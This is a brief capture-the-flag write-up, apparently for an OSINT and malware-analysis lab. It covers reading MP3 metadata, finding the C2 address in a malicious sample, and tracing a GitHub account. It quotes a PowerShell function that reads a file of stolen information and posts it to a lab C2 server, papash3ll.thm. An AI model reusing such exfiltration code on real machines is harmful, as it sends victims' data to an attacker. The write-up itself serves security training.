#Writeup

After running the
```bash
exiftool song.mp3
```
we can see that the actual autho of the song is listed as Tyler Ramsbey.

For the second flag, if we follow the link to the malicious code, if we read through the source code we can see the following function:
```php
# Function to send the stolen info to a C2 server
function Send-InfoToC2Server {
    $c2Url = "http://papash3ll.thm/data"
    $data = Get-Content -Path $infoFilePath -Raw

    # Using Invoke-WebRequest to send data to the C2 server
    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
}
```
we can clearly see that the c2Url variable contains the link to the C2 server which is in fact the correct flag.


From the github issue, if we follow the M.M. account we can see they have a repo for their profile, in which they have the name Mayor Malware which is the 3rd flag.

Finally for the 4th flag we can check the number of commits the repo that made the issue has which is just 1 commit.